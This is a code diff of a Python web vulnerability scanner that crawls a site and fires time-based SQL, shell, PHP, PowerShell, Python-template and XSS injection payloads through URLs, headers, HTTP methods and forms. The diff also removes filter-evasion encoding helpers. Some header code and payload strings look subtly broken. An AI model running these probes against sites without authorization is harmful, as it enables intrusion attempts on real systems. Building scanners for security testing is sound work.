@@ -12,81 +12,11 @@ CYAN = "\033[1;36m"
 GREEN = "\033[0;32m"
 RED = "\033[1;31m"
 
-def random_case(mal):
-    my_random = ""
-    for char in mal:
-        if random.choice([True, False]):
-            my_random += char.upper()
-        else:
-            my_random += char.lower()
-    
-    return my_random
-
-def random_string():
-    length = random.randint(8, 35)
-    random_string = "".join(random.choices(string.ascii_letters + string.digits, k=length))
-    
-    return random_string
-
-def mal_percent_encoding(mal):
-    gather = []
-
-    gather.append(urllib.parse.quote(mal))
-    gather.append(urllib.parse.quote(urllib.parse.quote(mal)))
-    gather.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-    gather.append(urllib.parse.quote_plus(mal))
-    gather.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-    gather.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-    gather.append(random_case(urllib.parse.quote(mal)))
-    gather.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-    gather.append(random_case(urllib.parse.quote_plus(mal)))
-    gather.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
-
-    return gather
-
-def mal_changer(mal):
-    gather = []
-    gather.append(f"./{mal}")
-    gather.append(f"../{mal}")
-    gather.append("".join(["&#x{:x}".format(ord(char)) for char in mal]))
-    gather.append(mal.replace("'", "\\'").replace('"', '\\"'))
-    gather.append("".join(["\\u00{:x}".format(ord(char)) for char in mal]))
-    gather.append(random_case(f"./{mal}"))
-    gather.append(random_case(f"../{mal}"))
-    gather.append(random_case("".join(["&#x{:x}".format(ord(char)) for char in mal])))
-    gather.append(random_case(mal.replace("'", "\\'").replace('"', '\\"')))
-    gather.append(random_case("".join(["\\u00{:x}".format(ord(char)) for char in mal])))
-
-    return gather
-
-def mal_url_parser(mal):
-    gather = []
-
-    gather.append(random_case(mal))
-    gather.append(random_string() + " " + mal)
-    gather.append(random_case(random_string() + mal))
-
-    new_gather = gather[:]
-    for i in new_gather:
-        results = (mal_changer(i))
-        for result in results:
-            gather.append(result)
-            
-    new_gather = gather[:]
-    for i in new_gather:
-        results = (mal_percent_encoding(i))
-        for result in results:
-            gather.append(result)
-
-    return gather
-
 def cobra(host,delay=0,crawl=1):
+    hits = []
+    
     clear()
     host = host.rstrip("/")
-    
-    hits = []
 
     mal_bash = [r"sleep 60",
                 r"\s\l\e\e\p \6\0",
@@ -152,7 +82,7 @@ def cobra(host,delay=0,crawl=1):
                  r'" AND SELECT SLEEP(60); --',
                  r"' OR SELECT SLEEP(60); --"]
 
-    mal_oracle = [r"DBMS_LOCK.sleep(60);",
+    mal_oracle_sql = [r"DBMS_LOCK.sleep(60);",
                   r"1 AND DBMS_LOCK.sleep(60);",
                   r"1 OR DBMS_LOCK.sleep(60);",
                   r"' 1 AND DBMS_LOCK.sleep(60);",
@@ -269,27 +199,100 @@ def cobra(host,delay=0,crawl=1):
 
     mal_powershell = [r"start-sleep -seconds 60",
                       r"start-sleep -seconds 60 #"]
+    
 
-    mal_python = [r"time.sleep(60)",
-                  r"__import__('time').sleep(60)",
-                  r"__import__('os').system('sleep 60')",
-                  r'eval("__import__(\'time\').sleep(60)")',
-                  r'eval("__import__(\'os\').system(\'sleep 60\')")',
-                  r'exec("__import__(\'time\').sleep(60)")',
-                  r'exec("__import__(\'os\').system(\'sleep 60\')")',
-                  r'exec("import time\ntime.sleep(60)',
-                  r'exec("import os\nos.system(\'sleep 60\')")',
-                  r"time.sleep(60) #",
-                  r"__import__('time').sleep(60) #",
-                  r"__import__('os').system('sleep 60') #",
-                  r'eval("__import__(\'time\').sleep(60)") #',
-                  r'eval("__import__(\'os\').system(\'sleep 60\')") #',
-                  r'exec("__import__(\'time\').sleep(60)") #',
-                  r'exec("__import__(\'os\').system(\'sleep 60\')") #',
-                  r'exec("import time\ntime.sleep(60) #',
-                  r'exec("import os\nos.system(\'sleep 60\')") #']
+    mal_python_reflective = [r"{{ <script>prompt(1)</script> }}",
+                            r"{% <script>prompt(1)</script> %}",
+                            r"return HttpResponse('<script>prompt(1)</script>')",
+                            r"return render_template('<script>prompt(1)</script>')"]
 
-    mal_xss = [r"<iframe>cobra</iframe>",
+    mal_python_time = [r"time.sleep(60)",
+                       r"__import__('time').sleep(60)",
+                       r"__import__('os').system('sleep 60')",
+                       r'eval("__import__(\'time\').sleep(60)")',
+                       r'eval("__import__(\'os\').system(\'sleep 60\')")',
+                       r'exec("__import__(\'time\').sleep(60)")',
+                       r'exec("__import__(\'os\').system(\'sleep 60\')")',
+                       r'exec("import time\ntime.sleep(60)',
+                       r'exec("import os\nos.system(\'sleep 60\')")',
+                       r"time.sleep(60) #",
+                       r"__import__('os').system('sleep 60') #",
+                       r'eval("__import__(\'time\').sleep(60)") #',
+                       r'eval("__import__(\'os\').system(\'sleep 60\')") #',
+                       r'exec("__import__(\'time\').sleep(60)") #',
+                       r'exec("__import__(\'os\').system(\'sleep 60\')") #',
+                       r'exec("import time\ntime.sleep(60) #',
+                       r'exec("import os\nos.system(\'sleep 60\')") #',
+                       r"{{ time.sleep(60) }}",
+                       r"{{ __import__('time').sleep(60) }}",
+                       r"{{ __import__('os').system('sleep 60') }}",
+                       r'{{ eval("__import__(\'time\').sleep(60)") }}',
+                       r'{{ eval("__import__(\'os\').system(\'sleep 60\')") }}',
+                       r'{{ exec("__import__(\'time\').sleep(60)") }}',
+                       r'{{ exec("__import__(\'os\').system(\'sleep 60\')") }}',
+                       r'{{ exec("import time\ntime.sleep(60) }}',
+                       r'{{ exec("import os\nos.system(\'sleep 60\')") }}',
+                       r"{{ time.sleep(60) }} #",
+                       r"{{ __import__('os').system('sleep 60') }} #",
+                       r'{{ eval("__import__(\'time\').sleep(60)") }} #',
+                       r'{{ eval("__import__(\'os\').system(\'sleep 60\')") }} #',
+                       r'{{ exec("__import__(\'time\').sleep(60)") }} #',
+                       r'{{ exec("__import__(\'os\').system(\'sleep 60\')") }} #',
+                       r'{{ exec("import time\ntime.sleep(60) }} #',
+                       r'{{ exec("import os\nos.system(\'sleep 60\')") }} #',
+                       r"{% time.sleep(60) %}",
+                       r"{% __import__('time').sleep(60) %}",
+                       r"{% __import__('os').system('sleep 60') %}",
+                       r'{% eval("__import__(\'time\').sleep(60)") %}',
+                       r'{% eval("__import__(\'os\').system(\'sleep 60\')") %}',
+                       r'{% exec("__import__(\'time\').sleep(60)") %}',
+                       r'{% exec("__import__(\'os\').system(\'sleep 60\')") %}',
+                       r'{% exec("import time\ntime.sleep(60 %})',
+                       r'{% exec("import os\nos.system(\'sleep 60\')") %}',
+                       r"{% time.sleep(60) %} #",
+                       r"{% __import__('os').system('sleep 60') %} #",
+                       r'{% eval("__import__(\'time\').sleep(60)") %} #',
+                       r'{% eval("__import__(\'os\').system(\'sleep 60\')") %} #',
+                       r'{% exec("__import__(\'time\').sleep(60)") %} #',
+                       r'{% exec("__import__(\'os\').system(\'sleep 60\')") %} #',
+                       r'{% exec("import time\ntime.sleep(60) %} #',
+                       r'{% exec("import os\nos.system(\'sleep 60\')") %} #',
+                       r"return render_template(time.sleep(60))",
+                       r"return render_template(__import__('time').sleep(60))",
+                       r"return render_template(__import__('os').system('sleep 60'))",
+                       r'return render_template(eval("__import__(\'time\').sleep(60)"))',
+                       r'return render_template(eval("__import__(\'os\').system(\'sleep 60\')"))',
+                       r'return render_template(exec("__import__(\'time\').sleep(60)"))',
+                       r'return render_template(exec("__import__(\'os\').system(\'sleep 60\')"))',
+                       r'return render_template(exec("import time\ntime.sleep(60))',
+                       r'return render_template(exec("import os\nos.system(\'sleep 60\')"))',
+                       r"return render_template(time.sleep(60)) #",
+                       r"return render_template(__import__('os').system('sleep 60')) #",
+                       r'return render_template(eval("__import__(\'time\').sleep(60)")) #',
+                       r'return render_template(eval("__import__(\'os\').system(\'sleep 60\')")) #',
+                       r'return render_template(exec("__import__(\'time\').sleep(60)")) #',
+                       r'return render_template(exec("__import__(\'os\').system(\'sleep 60\')")) #',
+                       r'return render_template(exec("import time\ntime.sleep(60)) #',
+                       r'return render_template(exec("import os\nos.system(\'sleep 60\')")) #',
+                       r"return HttpResponse(time.sleep(60))",
+                       r"return HttpResponse(__import__('time').sleep(60))",
+                       r"return HttpResponse(__import__('os').system('sleep 60'))",
+                       r'return HttpResponse(eval("__import__(\'time\').sleep(60)"))',
+                       r'return HttpResponse(eval("__import__(\'os\').system(\'sleep 60\')"))',
+                       r'return HttpResponse(exec("__import__(\'time\').sleep(60)"))',
+                       r'return HttpResponse(exec("__import__(\'os\').system(\'sleep 60\')"))',
+                       r'return HttpResponse(exec("import time\ntime.sleep(60))',
+                       r'return HttpResponse(exec("import os\nos.system(\'sleep 60\')"))',
+                       r"return HttpResponse(time.sleep(60)) #",
+                       r"return HttpResponse(__import__('os').system('sleep 60')) #",
+                       r'return HttpResponse(eval("__import__(\'time\').sleep(60)")) #',
+                       r'return HttpResponse(eval("__import__(\'os\').system(\'sleep 60\')")) #',
+                       r'return HttpResponse(exec("__import__(\'time\').sleep(60)")) #',
+                       r'return HttpResponse(exec("__import__(\'os\').system(\'sleep 60\')")) #',
+                       r'return HttpResponse(exec("import time\ntime.sleep(60)) #',
+                       r'return HttpResponse(exec("import os\nos.system(\'sleep 60\')")) #']
+
+    mal_reflective_xss = [r"<iframe>cobra</iframe>",
                r"<p>cobra</p>",
                r"<script>alert('cobra')</script>",
                r"<script>prompt('cobra')</script>",
@@ -479,77 +482,22 @@ def cobra(host,delay=0,crawl=1):
                r"> <style>body{background-color:red;}</style> <!--",
                r"> <title>cobra</title> <!--"]
 
-    init_mal_bash = mal_bash[:]
-    for mal in init_mal_bash:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_bash.append(result)
-            
-    init_mal_mssql = mal_mssql[:]
-    for mal in init_mal_mssql:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_mssql.append(result)
-
-    init_mal_mysql = mal_mysql[:]
-    for mal in init_mal_mysql:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_mysql.append(result)
-
-    init_mal_oracle = mal_oracle[:]
-    for mal in init_mal_oracle:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_oracle.append(result)
-
-    init_mal_php = mal_php[:]
-    for mal in init_mal_php:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_php.append(result)       
-        
-    init_mal_postgresql = mal_postgresql[:]
-    for mal in init_mal_postgresql:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_postgresql.append(result)
-
-    init_mal_powershell = mal_powershell[:]
-    for mal in init_mal_powershell:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_powershell.append(result)
-            
-    init_mal_python = mal_python[:]
-    for mal in init_mal_python:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_python.append(result)
-
-    init_mal_xss = mal_xss[:]
-    for mal in init_mal_xss:
-        results = mal_url_parser(mal)
-        for result in results:
-            mal_xss.append(result)
-
     hosts = kitten_crawler(host,delay,crawl)
 
     clear()
     for _ in hosts:
+        print(CYAN + f"checking: {_}")
+        time.sleep(delay)
         if urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(_).netloc:
             try:
-                forms = re.findall("<form[.\n]+form>",text(_).replace("\n",""))
-
-            except HTTPError as error:
-                forms = []
+                forms = re.findall(r"<form[.\n]+form>", text(_).replace("\n",""))
 
             except:
                 forms = []
 
-            # check for bash injection
+            # check for bash injection time based payload
+            print(CYAN + f"checking: {_} with bash injection time based payloads")
             for mal in mal_bash:
-                print(CYAN + f"checking: {_} with bash injection payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -561,6 +509,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"bash injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"bash injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"bash injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -594,12 +557,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"bash injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"bash injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -613,14 +591,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -663,14 +641,14 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
 
-            # check for emoji injection
+            # check for reflective emoji injection based payload
+            print(CYAN + f"checking: {_} with reflective emoji injection payloads")
             for mal in mal_emoji:
-                print(CYAN + f"checking: {_} with emoji injection payload {mal}")
                 try:
                     time.sleep(delay)
                     data = text(_ + "/" + mal)
                     if mal in data:
-                        hits.append(f"emoji injection in url: {_}/{mal}")
+                        hits.append(f"reflective emoji injection in url: {_}/{mal}")
 
                 except HTTPError as error:
                     pass
@@ -680,9 +658,24 @@ def cobra(host,delay=0,crawl=1):
 
                 try:
                     time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"emoji injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"emoji injection in method ({mal}): {_}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
                     data = text(_, headers = {"Cookie",mal})
                     if mal in data:
-                        hits.append(f"emoji injection in cookie ({mal}): {_}")
+                        hits.append(f"reflective emoji injection in cookie ({mal}): {_}")
 
                 except HTTPError as error:
                     pass
@@ -694,7 +687,19 @@ def cobra(host,delay=0,crawl=1):
                     time.sleep(delay)
                     data = text(_, headers = {"Referer",mal})
                     if mal in data:
-                        hits.append(f"emoji injection in referer ({mal}): {_}")
+                        hits.append(f"reflective emoji injection in referer ({mal}): {_}")
+
+                except HTTPError as error:
+                    pass
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    data = text(_, headers = {"X-Forwarded-For",mal})
+                    if mal in data:
+                        hits.append(f"reflective emoji injection in x-forwarded-for ({mal}): {_}")
 
                 except HTTPError as error:
                     pass
@@ -704,9 +709,9 @@ def cobra(host,delay=0,crawl=1):
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -720,14 +725,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -748,12 +753,12 @@ def cobra(host,delay=0,crawl=1):
                                 if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                     data = text(action,method=method_field,data=field_dict)
                                     if mal in data:
-                                        hits.append(f"emoji injection in forms: {action} | {field_dict}")
+                                        hits.append(f"reflective emoji injection in forms: {action} | {field_dict}")
 
                                 else:
                                     data = text(_,method=method_field,data=field_dict)
                                     if mal in data:
-                                        hits.append(f"emoji injection in forms: {_} | {field_dict}")
+                                        hits.append(f"reflective emoji injection in forms: {_} | {field_dict}")
 
                     except HTTPError as error:
                         pass
@@ -761,9 +766,9 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
 
-            # check for mssql injection
+            # check for mssql injection time based payload
+            print(CYAN + f"checking: {_} with mssql injection time based payloads")
             for mal in mal_mssql:
-                print(CYAN + f"checking: {_} with mssql injection payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -775,6 +780,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"mssql injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"mssql injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"mssql injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -808,12 +828,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"mssql injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"mssql injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -827,14 +862,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -877,9 +912,9 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
                                 
-            # check for mysql injection
+            # check for mysql injection time based payload
+            print(CYAN + f"checking: {_} with mysql injection time based payloads")
             for mal in mal_mysql:
-                print(CYAN + f"checking: {_} with mysql injection payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -891,6 +926,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"mysql injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"mysql injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"mysql injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -924,12 +974,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"mysql injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                   if error.code == 504:
+                       hits.append(f"mysql injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -943,14 +1008,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -993,20 +1058,35 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
 
-            # check for oracle injection
-            for mal in mal_oracle:
-                print(CYAN + f"checking: {_} with oracle injection payload {mal}")
+            # check for oracle sql injection time based payload
+            print(CYAN + f"checking: {_} with oracle sql injection time based payloads")
+            for mal in mal_oracle_sql:
                 try:
                     time.sleep(delay)
                     start = time.time()
                     data = text(_ + "/" + mal, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"oracle injection in url: {_}/{mal}")
+                        hits.append(f"oracle sql injection in url: {_}/{mal}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"oracle injection in url: {_}/{mal}")
+                        hits.append(f"oracle sql injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"oracle sql injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"oracle sql injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -1017,11 +1097,11 @@ def cobra(host,delay=0,crawl=1):
                     data = text(_, headers = {"Cookie",mal}, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"oracle injection in cookie ({mal}): {_}")
+                        hits.append(f"oracle sql injection in cookie ({mal}): {_}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"oracle injection in cookie ({mal}): {_}")
+                        hits.append(f"oracle sql injection in cookie ({mal}): {_}")
 
                 except:
                     pass
@@ -1032,20 +1112,35 @@ def cobra(host,delay=0,crawl=1):
                     data = text(_, headers = {"Referer",mal}, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"oracle injection in referer ({mal}): {_}")
+                        hits.append(f"oracle sql injection in referer ({mal}): {_}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"oracle injection in referer ({mal}): {_}")
+                        hits.append(f"oracle sql injection in referer ({mal}): {_}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"oracle sql injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"oracle sql injection in x-forwarded-for ({mal}): {_}")
 
                 except:
                     pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -1059,14 +1154,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -1089,30 +1184,30 @@ def cobra(host,delay=0,crawl=1):
                                     data = text(action,method=method_field,data=field_dict, timeout=120)
                                     end = time.time()
                                     if end - start >= 55:
-                                        hits.append(f"oracle injection in forms: {action} | {field_dict}")
+                                        hits.append(f"oracle sql injection in forms: {action} | {field_dict}")
 
                                 else:
                                     start = time.time()
                                     data = text(_,method=method_field,data=field_dict, timeout=120)
                                     end = time.time()
                                     if end - start >= 55:
-                                        hits.append(f"oracle injection in forms: {_} | {field_dict}")
+                                        hits.append(f"oracle sql injection in forms: {_} | {field_dict}")
 
                     except HTTPError as error:
                         if error.code == 504:
                             if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
-                                hits.append(f"oracle injection in forms: {action} | {field_dict}")
+                                hits.append(f"oracle sql injection in forms: {action} | {field_dict}")
 
                             else:
-                                hits.append(f"oracle injection in forms: {_} | {field_dict}")
+                                hits.append(f"oracle sql injection in forms: {_} | {field_dict}")
 
                     except:
                         pass
                                 
 
-            # check for php injection
+            # check for php injection time based payload
+            print(CYAN + f"checking: {_} with php injection time based payloads")
             for mal in mal_php:
-                print(CYAN + f"checking: {_} with php payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -1124,6 +1219,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"php injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
